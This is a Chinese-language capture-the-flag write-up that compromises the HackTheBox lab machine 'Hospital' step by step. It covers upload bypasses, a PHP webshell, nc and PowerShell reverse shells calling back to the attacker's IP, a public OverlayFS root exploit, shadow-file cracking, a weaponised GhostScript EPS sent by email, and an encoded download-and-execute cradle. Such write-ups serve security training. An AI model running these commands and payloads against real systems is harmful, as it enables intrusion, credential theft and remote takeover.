# 概述

​		首先从8080口的web服务上通过文件上传获取webserver机器的立足点，在提权后转储机器上的用户名密码，能够破解其中一组凭证，使用该凭证可以登录443口上的邮件服务器，邮件中提到了`.eps`的文件和GhostScript，google搜索GhostScript发现存在命令执行的漏洞。利用命令执行获取hospital的初始立足点，然后利用web物理路径来提权。



# 01、基础信息收集

## 1.1 、端口扫描

1. 全TCP端口扫描

   ```
   └─# nmap -sS -Pn 10.10.11.241 -p- --min-rate 10000    
   PORT      STATE SERVICE
   22/tcp    open  ssh
   53/tcp    open  domain
   88/tcp    open  kerberos-sec
   135/tcp   open  msrpc
   139/tcp   open  netbios-ssn
   389/tcp   open  ldap
   443/tcp   open  https
   445/tcp   open  microsoft-ds
   464/tcp   open  kpasswd5
   593/tcp   open  http-rpc-epmap
   636/tcp   open  ldapssl
   1801/tcp  open  msmq
   2103/tcp  open  zephyr-clt
   2105/tcp  open  eklogin
   2107/tcp  open  msmq-mgmt
   2179/tcp  open  vmrdp
   3268/tcp  open  globalcatLDAP
   3269/tcp  open  globalcatLDAPssl
   3389/tcp  open  ms-wbt-server
   5985/tcp  open  wsman
   6404/tcp  open  boe-filesvr
   6406/tcp  open  boe-processsvr
   6407/tcp  open  boe-resssvr1
   6409/tcp  open  boe-resssvr3
   6613/tcp  open  unknown
   6626/tcp  open  wago-service
   8080/tcp  open  http-proxy
   9389/tcp  open  adws
   32282/tcp open  unknown
   ```

   从开放的端口来看，这可能是一台域控制器。

   

2. 全UDP端口扫描

   ```
   └─# nmap -sU -p- -Pn 10.10.11.241 --min-rate 10000   
   PORT    STATE SERVICE
   53/udp  open  domain
   123/udp open  ntp
   389/udp open  ldap
   ```

   

3. 开放端口相信信息扫描

   ``` 
   └─# nmap -sV -sC -Pn -O -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6613,6626,8080,9389,32282  10.10.11.241 --min-rate 10000
   PORT      STATE SERVICE           VERSION
   22/tcp    open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey: 
   |   256 e14b4b3a6d18666939f7aa74b3160aaa (ECDSA)
   |_  256 96c1dcd8972095e7015f20a24361cbca (ED25519)
   53/tcp    open  domain            Simple DNS Plus
   88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-22 08:16:50Z)
   135/tcp   open  msrpc             Microsoft Windows RPC
   139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
   389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
   | ssl-cert: Subject: commonName=DC
   | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
   | Not valid before: 2023-09-06T10:49:03
   |_Not valid after:  2028-09-06T10:49:03
   443/tcp   open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
   |_http-title: Hospital Webmail :: Welcome to Hospital Webmail
   |_ssl-date: TLS randomness does not represent time
   | tls-alpn: 
   |_  http/1.1
   |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
   | ssl-cert: Subject: commonName=localhost
   | Not valid before: 2009-11-10T23:48:47
   |_Not valid after:  2019-11-08T23:48:47
   445/tcp   open  microsoft-ds?
   464/tcp   open  kpasswd5?
   593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
   636/tcp   open  ldapssl?
   | ssl-cert: Subject: commonName=DC
   | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
   | Not valid before: 2023-09-06T10:49:03
   |_Not valid after:  2028-09-06T10:49:03
   1801/tcp  open  msmq?
   2103/tcp  open  msrpc             Microsoft Windows RPC
   2105/tcp  open  msrpc             Microsoft Windows RPC
   2107/tcp  open  msrpc             Microsoft Windows RPC
   2179/tcp  open  vmrdp?
   3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
   | ssl-cert: Subject: commonName=DC
   | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
   | Not valid before: 2023-09-06T10:49:03
   |_Not valid after:  2028-09-06T10:49:03
   3269/tcp  open  globalcatLDAPssl?
   | ssl-cert: Subject: commonName=DC
   | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
   | Not valid before: 2023-09-06T10:49:03
   |_Not valid after:  2028-09-06T10:49:03
   3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
   | ssl-cert: Subject: commonName=DC.hospital.htb
   | Not valid before: 2023-09-05T18:39:34
   |_Not valid after:  2024-03-06T18:39:34
   | rdp-ntlm-info: 
   |   Target_Name: HOSPITAL
   |   NetBIOS_Domain_Name: HOSPITAL
   |   NetBIOS_Computer_Name: DC
   |   DNS_Domain_Name: hospital.htb
   |   DNS_Computer_Name: DC.hospital.htb
   |   DNS_Tree_Name: hospital.htb
   |   Product_Version: 10.0.17763
   |_  System_Time: 2023-11-22T08:18:09+00:00
   5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
   |_http-server-header: Microsoft-HTTPAPI/2.0
   |_http-title: Not Found
   6404/tcp  open  msrpc             Microsoft Windows RPC
   6406/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
   6407/tcp  open  msrpc             Microsoft Windows RPC
   6409/tcp  open  msrpc             Microsoft Windows RPC
   6613/tcp  open  msrpc             Microsoft Windows RPC
   6626/tcp  open  msrpc             Microsoft Windows RPC
   8080/tcp  open  http              Apache httpd 2.4.55 ((Ubuntu))
   | http-cookie-flags: 
   |   /: 
   |     PHPSESSID: 
   |_      httponly flag not set
   |_http-server-header: Apache/2.4.55 (Ubuntu)
   |_http-open-proxy: Proxy might be redirecting requests
   | http-title: Login
   |_Requested resource was login.php
   9389/tcp  open  mc-nmf            .NET Message Framing
   32282/tcp open  msrpc             Microsoft Windows RPC
   Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
   Device type: general purpose
   Running (JUST GUESSING): Linux 4.X|5.X (85%)
   OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
   Aggressive OS guesses: Linux 4.15 - 5.6 (85%), Linux 5.0 (85%)
   No exact OS matches for host (test conditions non-ideal).
   Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
   
   Host script results:
   | smb2-time: 
   |   date: 2023-11-22T08:18:07
   |_  start_date: N/A
   | smb2-security-mode: 
   |   311: 
   |_    Message signing enabled and required
   |_clock-skew: mean: 6h59m51s, deviation: 0s, median: 6h59m50s
   ```

   首先在`/etc/hosts`中追加`10.10.11.241 DC DC.hospital.htb hospital.htb`

   

## 1.2、 TCP 53 DNS

1. 尝试区域传输，没有获取有用的信息

   ```
   └─# dig axfr @10.10.11.241 hospital.htb
   
   ; <<>> DiG 9.19.17-1-Debian <<>> axfr @10.10.11.241 hospital.htb
   ; (1 server found)
   ;; global options: +cmd
   ; Transfer failed.
   ```

2. 尝试子域名枚举

   ```
   └─# wfuzz -u http://10.10.11.241 -H "Host: FUZZ.hospital.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
   ```




## 1.3、 TCP 139/445 SMB

1. 简单枚举一下服务信息

   ```
   └─# python enum4linux-ng.py 10.10.11.241                                                                      
   =========================================
   |    SMB Dialect Check on 10.10.11.241    |
    =========================================
   [*] Trying on 445/tcp
   [+] Supported dialects and settings:
   Supported dialects:                                                                                                                                         
     SMB 1.0: false                                                                                                                                            
     SMB 2.02: true                                                                                                                                            
     SMB 2.1: true                                                                                                                                             
     SMB 3.0: true                                                                                                                                             
     SMB 3.1.1: true                                                                                                                                           
   Preferred dialect: SMB 3.0                                                                                                                                  
   SMB1 only: false                                                                                                                                            
   SMB signing required: true      
   
   ===========================================================
   |    Domain Information via SMB session for 10.10.11.241    |
    ===========================================================
   [*] Enumerating via unauthenticated SMB session on 445/tcp
   [+] Found domain information via SMB
   NetBIOS computer name: DC                                                                                                                                   
   NetBIOS domain name: HOSPITAL                                                                                                                               
   DNS domain: hospital.htb                                                                                                                                    
   FQDN: DC.hospital.htb                                                                                                                                       
   Derived membership: domain member                                                                                                                           
   Derived domain: HOSPITAL             
   
    ===============================================
   |    OS Information via RPC for 10.10.11.241    |
    ===============================================
   [*] Enumerating via unauthenticated SMB session on 445/tcp
   [+] Found OS information via SMB
   [*] Enumerating via 'srvinfo'
   [-] Skipping 'srvinfo' run, not possible with provided credentials
   [+] After merging OS information we have the following result:
   OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                    
   OS version: '10.0'                                                                                                                                          
   OS release: '1809'                                                                                                                                          
   OS build: '17763'                                                                                                                                           
   Native OS: not supported                                                                                                                                    
   Native LAN manager: not supported                                                                                                                           
   Platform id: null                                                                                                                                           
   Server type: null                                                                                                                                           
   Server type string: null   
   ```

   允许smb 2.0/3.0，目标机器可能是Windows 10, Windows Server 2019, Windows Server 2016



2. 测试发现不允许空凭证登录

   ```
   └─# smbmap -H 10.10.11.241 -u null -p null                                            
   
       ________  ___      ___  _______   ___      ___       __         _______
      /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
     (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
      \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
       __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
      /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
     (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
    -----------------------------------------------------------------------------
        SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                        https://github.com/ShawnDEvans/smbmap
   
   [*] Detected 1 hosts serving SMB
   [*] Established 0 SMB session(s)
   
   └─# smbclient --no-pass -L 10.10.11.241                          
   session setup failed: NT_STATUS_ACCESS_DENIED
   ```



## 1.4、 TCP 389 IDAP

1. 尝试空凭证查询域内信息，没有收获

   ```
   └─# ldapsearch -x -H ldap://10.10.11.241 -D "" -w "" -b "DC=hospital,DC=htb" > ldap.txt
   
   └─# cat ldap.txt                               
   # extended LDIF
   #
   # LDAPv3
   # base <DC=hospital,DC=htb> with scope subtree
   # filter: (objectclass=*)
   # requesting: ALL
   #
   
   # search result
   search: 2
   result: 1 Operations error
   text: 000004DC: LdapErr: DSID-0C090CF4, comment: In order to perform this opera
    tion a successful bind must be completed on the connection., data 0, v4563
   
   # numResponses: 1
   ```

   

## 1.5、 TCP 443 HTTPS

1. 指纹识别

   ```
   └─# whatweb https://10.10.11.241/
   https://10.10.11.241/ [200 OK] Apache[2.4.56], Bootstrap, Content-Language[en], Cookies[roundcube_sessid], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28], HttpOnly[roundcube_sessid], IP[10.10.11.241], JQuery, OpenSSL[1.1.1t], PHP[8.0.28], PasswordField[_pass], RoundCube, Script, Title[Hospital Webmail :: Welcome to Hospital Webmail], UncommonHeaders[x-robots-tag], X-Frame-Options[sameorigin], X-Powered-By[PHP/8.0.28]
   ```

   web服务器是apache 2.4.56，站点语言是php 8.0.28，站点标题是Hospital Webmail，不是什么开源的CMS。

   

2. 在浏览器中访问，默认是一个登录页面，简单的尝试了弱口令和sql注入没有成功。

   ![image-20231122094823187](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311221339066.png)

   

3. 枚举一下web子目录

   ```
   └─# gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u https://10.10.11.241 -x php -t 50 --no-error --no-progress -b "404,403"
   ```



## 1.6、 TCP 8080 HTTP

1. 指纹识别

   ```
   └─# whatweb http://10.10.11.241:8080
   http://10.10.11.241:8080 [302 Found] Apache[2.4.55], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.55 (Ubuntu)], IP[10.10.11.241], RedirectLocation[login.php]
   
   http://10.10.11.241:8080/login.php [200 OK] Apache[2.4.55], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.55 (Ubuntu)], IP[10.10.11.241], JQuery[3.2.1], PasswordField[password], Script, Title[Login]
   ```

   web服务器是apache 2.4.55，看标题又是一个登录页面。



2. 跟443上的服务不同的是，8080上的服务可以注册账号，使用注册的账户登录发现了一个文件上传点

   <img src="https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311221339398.png" alt="image-20231122095553901" style="zoom:67%;" />

   随便上传了一个jpg图片成功，但是没有回显文件上传后存储到了哪里。



3. 枚举一下web子目录

   ```
   └─# gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://10.10.11.241:8080/ -t 50 --no-error --no-progress
   ===============================================================
   Gobuster v3.6
   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   ===============================================================
   [+] Url:                     http://10.10.11.241:8080/
   [+] Method:                  GET
   [+] Threads:                 50
   [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
   [+] Negative Status codes:   404
   [+] User Agent:              gobuster/3.6
   [+] Timeout:                 10s
   ===============================================================
   Starting gobuster in directory enumeration mode
   ===============================================================
   /uploads              (Status: 301) [Size: 321] [--> http://10.10.11.241:8080/uploads/]
   /images               (Status: 301) [Size: 320] [--> http://10.10.11.241:8080/images/]
   /css                  (Status: 301) [Size: 317] [--> http://10.10.11.241:8080/css/]
   /fonts                (Status: 301) [Size: 319] [--> http://10.10.11.241:8080/fonts/]
   /js                   (Status: 301) [Size: 316] [--> http://10.10.11.241:8080/js/]
   /vendor               (Status: 301) [Size: 320] [--> http://10.10.11.241:8080/vendor/]
   /server-status        (Status: 403) [Size: 279]
   ===============================================================
   Finished
   ===============================================================
   ```

   发现了/uploads，在这个目录下找到了上传的文件`http://10.10.11.241:8080/uploads/cmd.jpg`



# 02、获取初始立足点

## 2.1、文件上传利用

1. 测试发现无法直接上传.php后缀的文件，尝试文件上传绕过

   我尝试了修改后缀名，修改文件头，都没有成功。

   

2. 枚举可以允许上传的文件后缀名

   因为已经确认了是php类型的站点，因此尝试所有可用的php后缀，下列后缀名表达来自于[hacktricks](https://book.hacktricks.xyz/pentesting-web/file-upload)

   ```
   .php
   .php2
   .php3
   .php4
   .php5
   .php6
   .php7
   .phps
   .phps
   .pht
   .phtm
   .phtml
   .pgif
   .shtml
   .htaccess
   .phar
   .inc
   .hphp
   .ctp
   .module
   ```

   这里确定`.phtml、.pgif、.shtml、.htaccess、.phar、 .inc、.hphp、.ctp、.module`这些后缀名有效

   ![image-20231122110510272](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311221339493.png)

上传cmd.phar成功，但是下列简单的webshell并不能得到回显。

```
<?php echo system($_REQUEST["cmd"]);?>
```

![image-20231122111223896](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311221339135.png)




3. 换用GitHub上的这个[php webshell](https://github.com/flozz/p0wny-shell)成功

   ![image-20231122111646895](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311221339678.png)

   我们似乎在一个其他环境中，目标机器是一台Linux。

   ![image-20231122115754317](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311221339781.png)

   获取目标机器的reverse shell

   ```
   www-data@webserver:…/html/uploads# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 443 >/tmp/f
   
   └─# nc -nvlp 443                       
   listening on [any] 443 ...
   connect to [10.10.16.4] from (UNKNOWN) [10.10.11.241] 6534
   /bin/sh: 0: can't access tty; job control turned off
   $ id
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

   

​		

## 2.2、webserver提权

1. 获取ptty shell

   ```
   python -c 'import pty;pty.spawn("/bin/bash")'，请根据需要替换python为python2或python3。
   
   export TERM=xterm
   
   Ctrl + Z 将 shell 置入后台。回到我们自己的终端，我们使用stty raw -echo; fg
   ```



2. 查看目标操作系统信息

   ```
   www-data@webserver:/var/www/html/uploads$ cat /etc/*-release
   DISTRIB_ID=Ubuntu
   DISTRIB_RELEASE=23.04
   DISTRIB_CODENAME=lunar
   DISTRIB_DESCRIPTION="Ubuntu 23.04"
   PRETTY_NAME="Ubuntu 23.04"
   NAME="Ubuntu"
   VERSION_ID="23.04"
   VERSION="23.04 (Lunar Lobster)"
   VERSION_CODENAME=lunar
   ID=ubuntu
   ID_LIKE=debian
   HOME_URL="https://www.ubuntu.com/"
   SUPPORT_URL="https://help.ubuntu.com/"
   BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
   PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
   UBUNTU_CODENAME=lunar
   LOGO=ubuntu-logo
   
   www-data@webserver:/$ uname -a
   Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
   ```

   注意到目标机器是ubuntu 23.04，内核版本是5.19.0-35-generic，5.19.0的内核容易受到OverlayFS 模块中两个易于利用的[权限提升漏洞](https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability)。

   ![image-20231122120732042](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311221339068.png)

3. 特权提升的负载来自于[CVE-2023-2640-CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)。

   ```
   www-data@webserver:/tmp$ wget http://10.10.16.4/exploit.sh -o exploit.sh
   www-data@webserver:/tmp$ chmod +x exploit.sh
   www-data@webserver:/tmp$ id
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   
   
   www-data@webserver:/tmp$ ./exploit.sh
   [+] You should be root now
   [+] Type 'exit' to finish and leave the house cleaned
   root@webserver:/tmp# id
   uid=0(root) gid=33(www-data) groups=33(www-data)
   ```

   

## 2.3、 webserver特权后枚举

1. 枚举web服务的目录，发现了链接数据库的凭证`root:my$qls3rv1c3!`

   ```
   root@webserver:/var/www/html# cat config.php 
   <?php
   /* Database credentials. Assuming you are running MySQL
   server with default setting (user 'root' with no password) */
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'root');
   define('DB_PASSWORD', 'my$qls3rv1c3!');
   define('DB_NAME', 'hospital');
    
   /* Attempt to connect to MySQL database */
   $link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
    
   // Check connection
   if($link === false){
       die("ERROR: Could not connect. " . mysqli_connect_error());
   }
   ?>
   ```

   使用该凭证连接上数据库，这里应该是8080口上web服务上的登录凭证，无法破解其余两个账户的凭证

   ```
   root@webserver:/var/www/html# mysql -uroot -p hospital
   Enter password: 
   Reading table information for completion of table and column names
   You can turn off this feature to get a quicker startup with -A
   
   Welcome to the MariaDB monitor.  Commands end with ; or \g.
   Your MariaDB connection id is 23
   Server version: 10.11.2-MariaDB-1 Ubuntu 23.04
   
   Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
   
   Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
   
   MariaDB [hospital]> show tables;
   +--------------------+
   | Tables_in_hospital |
   +--------------------+
   | users              |
   +--------------------+
   1 row in set (0.000 sec)
   
   MariaDB [hospital]> select * from users \g;
   +----+----------+--------------------------------------------------------------+---------------------+
   | id | username | password                                                     | created_at          |
   +----+----------+--------------------------------------------------------------+---------------------+
   |  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
   |  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
   |  3 | Yan      | $2y$10$eE3J1pKIyTA4.MOoWh2b7O4hFf2wOGZAPl8eOw5pbFXOW4LU5ker. | 2023-11-22 08:54:33 |
   +----+----------+--------------------------------------------------------------+---------------------+
   3 rows in set (0.001 sec)
   
   ERROR: No query specified
   ```

   

2. 转储werbserver机器上的/etc/shadow，来破解目标机器上的账户密码

   ```
   root@webserver:/var/www/html# cat /etc/shadow
   root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
   daemon:*:19462:0:99999:7:::
   bin:*:19462:0:99999:7:::
   sys:*:19462:0:99999:7:::
   sync:*:19462:0:99999:7:::
   games:*:19462:0:99999:7:::
   man:*:19462:0:99999:7:::
   lp:*:19462:0:99999:7:::
   mail:*:19462:0:99999:7:::
   news:*:19462:0:99999:7:::
   uucp:*:19462:0:99999:7:::
   proxy:*:19462:0:99999:7:::
   www-data:*:19462:0:99999:7:::
   backup:*:19462:0:99999:7:::
   list:*:19462:0:99999:7:::
   irc:*:19462:0:99999:7:::
   _apt:*:19462:0:99999:7:::
   nobody:*:19462:0:99999:7:::
   systemd-network:!*:19462::::::
   systemd-timesync:!*:19462::::::
   messagebus:!:19462::::::
   systemd-resolve:!*:19462::::::
   pollinate:!:19462::::::
   sshd:!:19462::::::
   syslog:!:19462::::::
   uuidd:!:19462::::::
   tcpdump:!:19462::::::
   tss:!:19462::::::
   landscape:!:19462::::::
   fwupd-refresh:!:19462::::::
   drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
   lxd:!:19612::::::
   mysql:!:19620::::::
   ```

   从哈希结构来看，drwilliams用户是sha512的哈希格式，root用户的哈希格式无法识别。

   成功破解了drwilliams用户的密码为`qwe123!@#`

   ```
   └─# john shadow --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt
   Using default input encoding: UTF-8
   Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
   Cost 1 (iteration count) is 5000 for all loaded hashes
   Will run 6 OpenMP threads
   Press 'q' or Ctrl-C to abort, almost any other key for status
   qwe123!@#        (drwilliams)     
   1g 0:00:00:21 DONE (2023-11-21 23:30) 0.04732g/s 10140p/s 10140c/s 10140C/s rufus11..pucci
   Use the "--show" option to display all of the cracked passwords reliably
   Session completed. 
   ```



3. 使用`drwilliams:qwe123!@#`登录上了443口上的web服务。

   它是一个邮件服务器，有一封邮件中提到了让目标用户发生`.eps`的文件到3D打印部门以便让GhostScript可视化。

   ![image-20231122123527506](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311221338442.png)

   google发现GhostScript存在一个命令注入的漏洞，漏洞编号是[CVE-2023-36664](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)

   

## 2.4、GhostScript漏洞利用

1. 使用自定义 IP 生成名为 rev_shell.eps 的新 EPS 文件（在 Unix 上触发时启动反向 shell）

   ```
   └─# python3 CVE_2023_36664_exploit.py --generate --revshell -ip 10.10.16.4 -port 443 --filename trigger_revshell --extension eps
   [+] Generated EPS payload file: trigger_revshell.eps
   ```

   将生成的恶意eps文件放在邮件附件中发送给目标

   ![image-20231122125958736](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311221338660.png)

   

2. 我们并没有获取reverse shell，结合443口上的nmap信息来看目标是windows机器，修改一下payload，如下所示

   ```
   └─# python3 CVE_2023_36664_exploit.py --generate --payload "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4ANAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQAKAA== " --filename trigger_revshell --extension eps
   [+] Generated EPS payload file: trigger_revshell.eps
   ```

   这里执行的payload是`IEX(New-Object System.Net.WebClient).DownloadString("http://10.10.16.4/Invoke-PowerShellTcp.ps1")`，下载并执行Invoke-PowerShellTcp.ps1来获取反向shell，但是由于单双引号嵌套的问题，因此对该命令进行了编码
   
   ```
   └─# echo 'IEX(New-Object System.Net.WebClient).DownloadString("http://10.10.16.4/Invoke-PowerShellTcp.ps1")'|iconv -t utf-16le|base64 -w0
   SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4ANAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQAKAA==  
   ```
   
   利用powershell的-enc去解码执行即可触发我们的有效负载。
   
   
   
   再次将恶意的eps文件发送给目标，不一会儿就触发了负载，成功获取了目标机器的shell
   
   ```
   └─# nc -nvlp 443                       
   listening on [any] 443 ...
   connect to [10.10.16.4] from (UNKNOWN) [10.10.11.241] 6268
   Windows PowerShell running as user drbrown on DC
   Copyright (C) 2015 Microsoft Corporation. All rights reserved.
   
   PS C:\Users\drbrown.HOSPITAL\Documents>whoami
   hospital\drbrown
   PS C:\Users\drbrown.HOSPITAL\Documents> ipconfig
   
   Windows IP Configuration
   
   
   Ethernet adapter vEthernet (Switch01):
   
      Connection-specific DNS Suffix  . : 
      Link-local IPv6 Address . . . . . : fe80::3488:527f:9c75:ed51%14
      IPv4 Address. . . . . . . . . . . : 192.168.5.1
      Subnet Mask . . . . . . . . . . . : 255.255.255.0
      Default Gateway . . . . . . . . . : 
   
   Ethernet adapter Ethernet0 2:
   
      Connection-specific DNS Suffix  . : 
      Link-local IPv6 Address . . . . . : fe80::dd8d:7010:6cc8:efd%12
      IPv4 Address. . . . . . . . . . . : 10.10.11.241
      Subnet Mask . . . . . . . . . . . : 255.255.254.0
      Default Gateway . . . . . . . . . : 10.10.10.2
   PS C:\Users\drbrown.HOSPITAL\Documents> 
   ```
   
   

# 03、特权提升

1. 上传winpeasany.exe检索提权向量

   发现我们对web服务路径拥有写权限

   ![image-20231122132449759](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311221338682.png)

   继续往下看发现我们是对整个C:\xampp文件拥有写权限

   ![image-20231122132715758](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311221338551.png)

​		

2. 在` C:\xampp\htdocs`中上传一个windows版本的[reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell)，然后访问获取shell，该shell来自system

   ```
   └─# nc -nvlp 4444
   listening on [any] 4444 ...
   connect to [10.10.16.4] from (UNKNOWN) [10.10.11.241] 15032
   SOCKET: Shell has connected! PID: 7360
   Microsoft Windows [Version 10.0.17763.4974]
   (c) 2018 Microsoft Corporation. All rights reserved.
   
   C:\xampp\htdocs>whoami
   nt authority\system
   ```

   